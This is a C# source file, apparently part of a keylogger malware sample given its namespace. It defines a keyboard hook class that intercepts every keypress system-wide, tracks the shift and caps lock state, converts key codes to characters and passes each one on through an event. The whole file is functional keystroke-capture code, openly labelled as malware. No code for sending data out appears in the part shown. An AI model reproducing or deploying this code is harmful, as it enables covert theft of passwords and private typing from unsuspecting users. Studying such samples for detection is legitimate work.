using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace MalwareSample.Keylogger.Logger
{
    public class KeyboardHook : HookType
    {
        public enum KeyboardState
        {
            KeyDown = 0x0100,
            KeyUp = 0x0101
        }

        public delegate void KeyPressed(char? a);
        public event KeyPressed KeyWasPressed;

        private enum SpecialKeysUpperCase
        {
            LShiftKey = 160,
            RShiftKey = 161,
            Capital = 20
        }

        [DllImport("user32.dll", CharSet = CharSet.Unicode)]
        public static extern int ToUnicodeEx(int wVirtKey, uint wScanCode, byte[] lpKeyState, StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);

        public static char? ConvertFromKey(int keys, bool shift, bool capsLock)
        {
            var keyStates = new byte[256];
            if (shift)
                keyStates[16] = 0x80;
            if (capsLock)
                keyStates[20] = 0x80;

            var sb = new StringBuilder(10);
            int ret = ToUnicodeEx(keys, 0, keyStates, sb, sb.Capacity, 0, InputLanguage.CurrentInputLanguage.Handle);

            return ret == 1 ? (char?)sb[0] : null;
        }

        bool shift = false;
        bool capital = false;
        protected override IntPtr DefaultHookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            IntPtr intptr = this.CallNextHook(nCode, wParam, lParam);

            if (this.GetHookType() == Type.Keyboard && nCode >= 0)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                Keys key = (Keys)vkCode;

                if (wParam == (IntPtr)KeyboardState.KeyDown)
                {

                    if ((int)key == (int)SpecialKeysUpperCase.LShiftKey || (int)key == (int)SpecialKeysUpperCase.RShiftKey)
                    {
                        shift = true;
                    }
                    else if ((int)key == (int)SpecialKeysUpperCase.Capital)
                    {
                        capital = !capital;
                    }
                    else if (key == Keys.Enter) { KeyWasPressed('\n'); }
                    else if (KeyWasPressed != null) KeyWasPressed(ConvertFromKey((int)key, shift, capital));
                }

                if (shift && wParam == (IntPtr)KeyboardState.KeyUp && ((int)key == (int)SpecialKeysUpperCase.LShiftKey || (int)key == (int)SpecialKeysUpperCase.RShiftKey))
                {
                    shift = false;
                }
            }

            return intptr;
        }

        public override Type GetHookType()
        {
            return HookType.Type.Keyboard;
        }
    }
}
